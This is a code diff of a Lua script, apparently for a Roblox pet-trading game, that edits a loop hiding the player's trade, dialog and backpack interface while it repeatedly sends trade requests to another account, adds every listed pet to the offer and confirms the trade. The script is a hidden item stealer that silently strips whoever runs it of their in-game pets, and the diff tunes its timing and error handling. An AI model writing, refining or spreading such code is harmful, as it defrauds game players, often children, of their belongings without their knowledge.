@@ -89,12 +89,14 @@ tp()
 
 spawn(function()
     while true do
-        sleep(0.02)
+        pcall(function()
+        wait(0.02)
         Player.PlayerGui.DialogApp.Dialog.Visible = false
         Player.PlayerGui.TradeApp.Frame.Visible = false
         Player.PlayerGui.HintApp.TextLabel.Visible = false
         Player.PlayerGui.InteractionsApp.BasicSelects.Visible = false
         Player.PlayerGui.ToolApp.Frame.OpenBackpack.Visible = false
+        end)
     end
 end)
 
@@ -139,8 +141,8 @@ end
 while true do
     pcall(function()  
     ReplicatedStorage.API:FindFirstChild("TradeAPI/SendTradeRequest"):FireServer(Playt)
-    end)
-    wait(3)
+
+    wait(2)
 
     for i, v in pairs(petslist) do
         ReplicatedStorage.API:FindFirstChild("TradeAPI/AddItemToOffer"):FireServer(v[1])
@@ -158,4 +160,5 @@ while true do
             ReplicatedStorage.API:FindFirstChild("TradeAPI/ConfirmTrade"):FireServer()
         end
     end
+end)
 end
